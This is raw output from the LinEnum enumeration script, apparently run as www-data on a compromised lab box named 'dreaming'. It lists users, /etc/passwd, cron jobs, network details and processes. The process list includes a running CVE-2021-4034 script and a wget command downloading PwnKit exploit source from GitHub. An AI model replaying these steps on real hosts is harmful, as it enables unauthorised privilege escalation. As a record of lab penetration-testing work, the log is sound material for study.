```

[00;31m#########################################################[00m
[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
[00;31m#########################################################[00m
[00;33m# www.rebootuser.com[00m
[00;33m# version 0.982[00m

[-] Debug Info
[00;33m[+] Thorough tests = Disabled[00m


[00;33mScan started at:
Mon Jun 10 07:13:31 UTC 2024
[00m

[00;33m### SYSTEM ##############################################[00m
[00;31m[-] Kernel information:[00m
Linux dreaming 5.4.0-155-generic #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


[00;31m[-] Kernel information (continued):[00m
Linux version 5.4.0-155-generic (buildd@lcy02-amd64-103) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023


[00;31m[-] Specific release information:[00m
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


[00;31m[-] Hostname:[00m
dreaming


[00;33m### USER/GROUP ##########################################[00m
[00;31m[-] Current user/group info:[00m
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[00;31m[-] Users that have previously logged onto the system:[00m
Username         Port     From             Latest
root             pts/0    192.168.1.105    Thu Nov 23 01:11:01 +0000 2023
lucien           pts/0    192.168.1.102    Mon Aug  7 23:34:46 +0000 2023
death            tty1                      Fri Nov 17 21:44:20 +0000 2023


[00;31m[-] Who else is logged on:[00m
 07:13:31 up 22 min,  0 users,  load average: 0.19, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[00;31m[-] Group memberships:[00m
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon) groups=1(daemon)
uid=111(fwupd-refresh) gid=116(fwupd-refresh) groups=116(fwupd-refresh)
uid=112(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)
uid=998(lxd) gid=100(users) groups=100(users)
uid=114(mysql) gid=118(mysql) groups=118(mysql)
uid=1001(death) gid=1001(death) groups=1001(death)
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)


[00;31m[-] It looks like we have some admin users:[00m
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)


[00;31m[-] Contents of /etc/passwd:[00m
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash


[00;31m[-] Super user account(s):[00m
root


[00;31m[-] Accounts that have recently used sudo:[00m
/home/lucien/.sudo_as_admin_successful


[00;31m[-] Are permissions on /home directories lax:[00m
total 20K
drwxr-xr-x  5 root     root     4.0K Jul 28  2023 .
drwxr-xr-x 20 root     root     4.0K Jul 28  2023 ..
drwxr-xr-x  4 death    death    4.0K Aug 25  2023 death
drwxr-xr-x  5 lucien   lucien   4.0K Aug 25  2023 lucien
drwxr-xr-x  3 morpheus morpheus 4.0K Aug  7  2023 morpheus


[00;31m[-] Root is allowed to login via SSH:[00m
PermitRootLogin yes


[00;33m### ENVIRONMENTAL #######################################[00m
[00;31m[-] Environment information:[00m
PWD=/var/www/html/app/pluck-4.7.13/files
APACHE_LOG_DIR=/var/log/apache2
LANG=C
INVOCATION_ID=27aafa81ce9b4a278e8e0a986fef8545
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=0
APACHE_RUN_DIR=/var/run/apache2
JOURNAL_STREAM=9:21783
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env


[00;31m[-] Path information:[00m
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
lrwxrwxrwx 1 root root     7 Mar 14  2023 /bin -> usr/bin
lrwxrwxrwx 1 root root     8 Mar 14  2023 /sbin -> usr/sbin
drwxr-xr-x 2 root root  4096 Mar 14  2023 /snap/bin
drwxr-xr-x 2 root root 36864 Nov 23  2023 /usr/bin
drwxr-xr-x 2 root root  4096 Mar 14  2023 /usr/local/bin
drwxr-xr-x 2 root root  4096 Mar 14  2023 /usr/local/sbin
drwxr-xr-x 2 root root 20480 Jul 28  2023 /usr/sbin


[00;31m[-] Available shells:[00m
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen


[00;31m[-] Current umask value:[00m
0022
u=rwx,g=rx,o=rx


[00;31m[-] umask value as specified in /etc/login.defs:[00m
UMASK		022


[00;31m[-] Password and storage information:[00m
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


[00;33m### JOBS/TASKS ##########################################[00m
[00;31m[-] Cron jobs:[00m
-rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jul 28  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  190 Mar 14  2023 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Jul 28  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  539 Feb 23  2021 apache2
-rwxr-xr-x   1 root root  376 Sep 16  2021 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Jan 20  2023 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Mar 14  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jul 28  2023 .
drwxr-xr-x 104 root root 4096 Nov 23  2023 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  403 Jan 20  2023 update-notifier-common


[00;31m[-] Crontab contents:[00m
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[00;31m[-] Systemd timers:[00m
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Mon 2024-06-10 07:24:32 UTC 10min left    Fri 2023-11-17 04:31:54 UTC 6 months 23 days ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Mon 2024-06-10 07:39:00 UTC 25min left    Mon 2024-06-10 07:09:01 UTC 4min 35s ago         phpsessionclean.timer        phpsessionclean.service       
Mon 2024-06-10 07:58:22 UTC 44min left    Fri 2023-11-17 04:31:50 UTC 6 months 23 days ago fwupd-refresh.timer          fwupd-refresh.service         
Mon 2024-06-10 08:04:50 UTC 51min left    Fri 2023-11-17 22:07:47 UTC 6 months 22 days ago motd-news.timer              motd-news.service             
Mon 2024-06-10 12:54:17 UTC 5h 40min left Fri 2023-11-17 22:20:28 UTC 6 months 22 days ago apt-daily.timer              apt-daily.service             
Tue 2024-06-11 00:00:00 UTC 16h left      Mon 2024-06-10 06:51:56 UTC 21min ago            logrotate.timer              logrotate.service             
Tue 2024-06-11 00:00:00 UTC 16h left      Mon 2024-06-10 06:51:56 UTC 21min ago            man-db.timer                 man-db.service                
Tue 2024-06-11 07:06:26 UTC 23h left      Mon 2024-06-10 07:06:26 UTC 7min ago             systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2024-06-16 03:10:39 UTC 5 days left   Mon 2024-06-10 06:52:27 UTC 21min ago            e2scrub_all.timer            e2scrub_all.service           
Mon 2024-06-17 00:00:00 UTC 6 days left   Mon 2024-06-10 06:51:56 UTC 21min ago            fstrim.timer                 fstrim.service                

10 timers listed.
[2mEnable thorough tests to see inactive timers[00m


[00;33m### NETWORKING  ##########################################[00m
[00;31m[-] Network and IP info:[00m
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:aa:39:f2:4d:ad brd ff:ff:ff:ff:ff:ff
    inet 10.10.85.122/16 brd 10.10.255.255 scope global dynamic ens5
       valid_lft 2298sec preferred_lft 2298sec
    inet6 fe80::aa:39ff:fef2:4dad/64 scope link 
       valid_lft forever preferred_lft forever


[00;31m[-] ARP history:[00m
10.10.0.1 dev ens5 lladdr 02:c8:85:b5:5a:aa STALE
10.10.102.239 dev ens5 lladdr 02:4b:f6:09:93:93 REACHABLE


[00;31m[-] Nameserver(s):[00m
nameserver 127.0.0.53


[00;31m[-] Nameserver(s):[00m
Global
       LLMNR setting: no                  
MulticastDNS setting: no                  
  DNSOverTLS setting: no                  
      DNSSEC setting: no                  
    DNSSEC supported: no                  
          DNSSEC NTA: 10.in-addr.arpa     
                      16.172.in-addr.arpa 
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa 
                      18.172.in-addr.arpa 
                      19.172.in-addr.arpa 
                      20.172.in-addr.arpa 
                      21.172.in-addr.arpa 
                      22.172.in-addr.arpa 
                      23.172.in-addr.arpa 
                      24.172.in-addr.arpa 
                      25.172.in-addr.arpa 
                      26.172.in-addr.arpa 
                      27.172.in-addr.arpa 
                      28.172.in-addr.arpa 
                      29.172.in-addr.arpa 
                      30.172.in-addr.arpa 
                      31.172.in-addr.arpa 
                      corp                
                      d.f.ip6.arpa        
                      home                
                      internal            
                      intranet            
                      lan                 
                      local               
                      private             
                      test                

Link 2 (ens5)
      Current Scopes: DNS                       
DefaultRoute setting: yes                       
       LLMNR setting: yes                       
MulticastDNS setting: no                        
  DNSOverTLS setting: no                        
      DNSSEC setting: no                        
    DNSSEC supported: no                        
  Current DNS Server: 10.0.0.2                  
         DNS Servers: 10.0.0.2                  
          DNS Domain: eu-west-1.compute.internal


[00;31m[-] Default route:[00m
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.85.122 metric 100 


[00;31m[-] Listening TCP:[00m
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        70             127.0.0.1:33060          0.0.0.0:*              
LISTEN  0        151            127.0.0.1:3306           0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
LISTEN  0        511                    *:80                   *:*              
LISTEN  0        128                 [::]:22                [::]:*              


[00;31m[-] Listening UDP:[00m
State   Recv-Q  Send-Q       Local Address:Port     Peer Address:Port  Process  
UNCONN  0       0        10.10.85.122%ens5:68            0.0.0.0:*              
UNCONN  0       0            127.0.0.53%lo:53            0.0.0.0:*              


[00;33m### SERVICES #############################################[00m
[00;31m[-] Running processes:[00m
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  1.0 170108 10428 ?        Ss   06:51   0:01 /sbin/init splash noprompt noshell automatic-ubiquity vt.handoff=7 console=ttyS0
root           2  0.0  0.0      0     0 ?        S    06:51   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   06:51   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   06:51   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   06:51   0:00 [kworker/0:0H-kblockd]
root           8  0.0  0.0      0     0 ?        I<   06:51   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    06:51   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    06:51   0:00 [rcu_sched]
root          11  0.0  0.0      0     0 ?        S    06:51   0:00 [migration/0]
root          12  0.0  0.0      0     0 ?        S    06:51   0:00 [idle_inject/0]
root          13  0.0  0.0      0     0 ?        I    06:51   0:00 [kworker/0:1-mm_percpu_wq]
root          14  0.0  0.0      0     0 ?        S    06:51   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    06:51   0:00 [cpuhp/1]
root          16  0.0  0.0      0     0 ?        S    06:51   0:00 [idle_inject/1]
root          17  0.0  0.0      0     0 ?        S    06:51   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    06:51   0:00 [ksoftirqd/1]
root          19  0.0  0.0      0     0 ?        I    06:51   0:00 [kworker/1:0-events]
root          20  0.0  0.0      0     0 ?        I<   06:51   0:00 [kworker/1:0H-kblockd]
root          21  0.0  0.0      0     0 ?        S    06:51   0:00 [kdevtmpfs]
root          22  0.0  0.0      0     0 ?        I<   06:51   0:00 [netns]
root          23  0.0  0.0      0     0 ?        S    06:51   0:00 [rcu_tasks_kthre]
root          24  0.0  0.0      0     0 ?        S    06:51   0:00 [kauditd]
root          25  0.0  0.0      0     0 ?        S    06:51   0:00 [khungtaskd]
root          26  0.0  0.0      0     0 ?        S    06:51   0:00 [oom_reaper]
root          27  0.0  0.0      0     0 ?        I<   06:51   0:00 [writeback]
root          28  0.0  0.0      0     0 ?        S    06:51   0:00 [kcompactd0]
root          29  0.0  0.0      0     0 ?        SN   06:51   0:00 [ksmd]
root          30  0.0  0.0      0     0 ?        SN   06:51   0:00 [khugepaged]
root          76  0.0  0.0      0     0 ?        I<   06:51   0:00 [kintegrityd]
root          77  0.0  0.0      0     0 ?        I<   06:51   0:00 [kblockd]
root          78  0.0  0.0      0     0 ?        I<   06:51   0:00 [blkcg_punt_bio]
root          79  0.0  0.0      0     0 ?        I<   06:51   0:00 [tpm_dev_wq]
root          80  0.0  0.0      0     0 ?        I<   06:51   0:00 [ata_sff]
root          81  0.0  0.0      0     0 ?        I<   06:51   0:00 [md]
root          82  0.0  0.0      0     0 ?        I<   06:51   0:00 [edac-poller]
root          83  0.0  0.0      0     0 ?        I<   06:51   0:00 [devfreq_wq]
root          84  0.0  0.0      0     0 ?        S    06:51   0:00 [watchdogd]
root          88  0.0  0.0      0     0 ?        S    06:51   0:00 [kswapd0]
root          89  0.0  0.0      0     0 ?        S    06:51   0:00 [ecryptfs-kthrea]
root          91  0.0  0.0      0     0 ?        I<   06:51   0:00 [kthrotld]
root          92  0.0  0.0      0     0 ?        I<   06:51   0:00 [acpi_thermal_pm]
root          93  0.0  0.0      0     0 ?        I<   06:51   0:00 [vfio-irqfd-clea]
root          94  0.0  0.0      0     0 ?        I<   06:51   0:00 [ipv6_addrconf]
root         103  0.0  0.0      0     0 ?        I<   06:51   0:00 [kstrp]
root         106  0.0  0.0      0     0 ?        I    06:51   0:00 [kworker/0:2-cgroup_destroy]
root         107  0.0  0.0      0     0 ?        I<   06:51   0:00 [kworker/u5:0]
root         120  0.0  0.0      0     0 ?        I<   06:51   0:00 [charger_manager]
root         154  0.0  0.0      0     0 ?        I<   06:51   0:00 [ena]
root         155  0.0  0.0      0     0 ?        I<   06:51   0:00 [nvme-wq]
root         157  0.0  0.0      0     0 ?        I<   06:51   0:00 [cryptd]
root         158  0.0  0.0      0     0 ?        I<   06:51   0:00 [nvme-reset-wq]
root         159  0.0  0.0      0     0 ?        I<   06:51   0:00 [nvme-delete-wq]
root         204  0.0  0.0      0     0 ?        I<   06:51   0:00 [kdmflush]
root         235  0.0  0.0      0     0 ?        I<   06:51   0:00 [raid5wq]
root         283  0.0  0.0      0     0 ?        S    06:51   0:00 [jbd2/dm-0-8]
root         284  0.0  0.0      0     0 ?        I<   06:51   0:00 [ext4-rsv-conver]
root         320  0.0  0.0      0     0 ?        I<   06:51   0:00 [kworker/0:1H-kblockd]
root         344  0.0  0.0      0     0 ?        I<   06:51   0:00 [kworker/1:1H-kblockd]
root         359  0.0  1.0  35708 10124 ?        S<s  06:51   0:00 /lib/systemd/systemd-journald
root         397  0.0  0.6  23148  6124 ?        Ss   06:51   0:01 /lib/systemd/systemd-udevd
root         541  0.0  0.0      0     0 ?        I<   06:51   0:00 [kaluad]
root         542  0.0  0.0      0     0 ?        I<   06:51   0:00 [kmpath_rdacd]
root         543  0.0  0.0      0     0 ?        I<   06:51   0:00 [kmpathd]
root         544  0.0  0.0      0     0 ?        I<   06:51   0:00 [kmpath_handlerd]
root         545  0.0  1.8 280136 17948 ?        SLsl 06:51   0:00 /sbin/multipathd -d -s
root         557  0.0  0.0      0     0 ?        S<   06:51   0:00 [loop0]
root         561  0.0  0.0      0     0 ?        S<   06:51   0:00 [loop1]
root         563  0.0  0.0      0     0 ?        S<   06:51   0:00 [loop2]
root         564  0.0  0.0      0     0 ?        S<   06:51   0:00 [loop3]
root         565  0.0  0.0      0     0 ?        S<   06:51   0:00 [loop4]
root         571  0.0  0.0      0     0 ?        S    06:51   0:00 [jbd2/nvme0n1p2-]
root         572  0.0  0.0      0     0 ?        I<   06:51   0:00 [ext4-rsv-conver]
systemd+     584  0.0  0.5  90884  5732 ?        Ssl  06:51   0:00 /lib/systemd/systemd-timesyncd
systemd+     636  0.0  0.6  27272  6548 ?        Ss   06:51   0:00 /lib/systemd/systemd-networkd
systemd+     641  0.0  1.1  24684 11280 ?        Ss   06:51   0:00 /lib/systemd/systemd-resolved
root         653  0.0  0.6 235564  5900 ?        Ssl  06:51   0:00 /usr/lib/accountsservice/accounts-daemon
root         654  0.0  1.3 1241548 13376 ?       Ssl  06:51   0:00 /usr/bin/amazon-ssm-agent
root         658  0.0  0.2   6816  2884 ?        Ss   06:51   0:00 /usr/sbin/cron -f
message+     659  0.0  0.4   7632  4516 ?        Ss   06:51   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         664  0.0  0.3  81828  3380 ?        Ssl  06:51   0:00 /usr/sbin/irqbalance --foreground
root         667  0.0  1.5  29668 14872 ?        Ss   06:51   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         669  0.0  0.7 234444  6864 ?        Ssl  06:51   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       671  0.0  0.4 224344  4584 ?        Ssl  06:51   0:00 /usr/sbin/rsyslogd -n -iNONE
root         673  0.1  2.0 1319180 20192 ?       Ssl  06:51   0:01 /usr/lib/snapd/snapd
root         676  0.0  0.7  17224  7140 ?        Ss   06:51   0:00 /lib/systemd/systemd-logind
root         678  0.0  1.0 393204  9700 ?        Ssl  06:51   0:00 /usr/lib/udisks2/udisksd
daemon       681  0.0  0.2   3796  2068 ?        Ss   06:51   0:00 /usr/sbin/atd -f
root         735  0.0  0.1   5828  1716 tty1     Ss+  06:51   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         758  0.0  1.7 107924 16604 ?        Ssl  06:51   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         762  0.0  0.8 315108  7732 ?        Ssl  06:51   0:00 /usr/sbin/ModemManager
root         766  0.0  0.6  12184  6396 ?        Ss   06:51   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         805  0.0  1.2 193448 12116 ?        Ss   06:51   0:00 /usr/sbin/apache2 -k start
www-data     812  0.0  1.2 194096 11784 ?        S    06:51   0:00 /usr/sbin/apache2 -k start
www-data     813  0.0  0.9 193956  8804 ?        S    06:51   0:00 /usr/sbin/apache2 -k start
www-data     814  0.0  1.2 194116 12016 ?        S    06:51   0:00 /usr/sbin/apache2 -k start
www-data     815  0.0  1.1 194068 11476 ?        S    06:51   0:00 /usr/sbin/apache2 -k start
www-data     816  0.0  1.2 194208 12040 ?        S    06:51   0:00 /usr/sbin/apache2 -k start
mysql        975  0.8 39.7 1791552 383240 ?      Ssl  06:52   0:11 /usr/sbin/mysqld
root        1142  0.0  0.0      0     0 ?        I    06:59   0:00 [kworker/u4:2-events_power_efficient]
www-data    1159  0.0  1.0 193956 10128 ?        S    07:03   0:00 /usr/sbin/apache2 -k start
www-data    1176  0.0  0.9 193956  9128 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
root        1202  0.0  0.0      0     0 ?        I    07:05   0:00 [kworker/u4:1-events_power_efficient]
root        1223  0.0  0.0      0     0 ?        I    07:06   0:00 [kworker/1:1-events]
www-data    1256  0.0  0.0   2608   596 ?        S    07:08   0:00 sh -c ./cve-2021-4034.sh 2>&1
www-data    1257  0.0  0.0   2608   536 ?        S    07:08   0:00 sh ./cve-2021-4034.sh
www-data    1346  0.0  0.9 193956  9080 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
root        1377  0.0  0.0      0     0 ?        I    07:12   0:00 [kworker/u4:0-events_power_efficient]
root        1594  0.0  0.0      0     0 ?        I    07:12   0:00 [kworker/1:2-events]
www-data    1936  0.0  0.6   9708  6252 ?        S    07:13   0:00 wget --no-hsts -q https://raw.githubusercontent.com/berdav/CVE-2021-4034/main//cve-2021-4034.c -O cve-2021-4034.c
www-data    1944  0.0  0.0   2608   596 ?        S    07:13   0:00 sh -c ./LinEnum.sh > lin.out 2>&1
www-data    1945  0.0  0.3   4768  3832 ?        S    07:13   0:00 /bin/bash ./LinEnum.sh
www-data    1946  0.5  0.2   4900  2800 ?        S    07:13   0:00 /bin/bash ./LinEnum.sh
www-data    1947  0.0  0.0   2516   516 ?        S    07:13   0:00 tee -a
www-data    2147  0.0  0.2   4900  2628 ?        S    07:13   0:00 /bin/bash ./LinEnum.sh
www-data    2148  0.0  0.2   5892  2856 ?        R    07:13   0:00 ps aux


[00;31m[-] Process binaries and associated permissions (from above list):[00m
-rwxr-xr-x 1 root root  1183448 Apr 18  2022 /bin/bash
-rwxr-xr-x 1 root root   162032 Mar 27  2023 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   268576 Mar 27  2023 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  2245632 Mar 27  2023 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   415968 Mar 27  2023 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    55520 Mar 27  2023 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   760392 Mar 27  2023 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    69000 May 30  2023 /sbin/agetty
lrwxrwxrwx 1 root root       20 Mar 27  2023 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   129224 Oct 31  2022 /sbin/multipathd
-rwxr-xr-x 1 root root 14848760 Oct 24  2023 /usr/bin/amazon-ssm-agent
-rwxr-xr-x 1 root root   249032 Oct 25  2022 /usr/bin/dbus-daemon
lrwxrwxrwx 1 root root        9 Mar 13  2020 /usr/bin/python3 -> python3.8
-rwxr-xr-x 1 root root   203192 Jun 20  2023 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root   121504 Feb 21  2022 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 32867920 May 29  2023 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   483056 Sep  6  2021 /usr/lib/udisks2/udisksd
-rwxr-xr-x 1 root root  1915728 Apr  8  2022 /usr/sbin/ModemManager
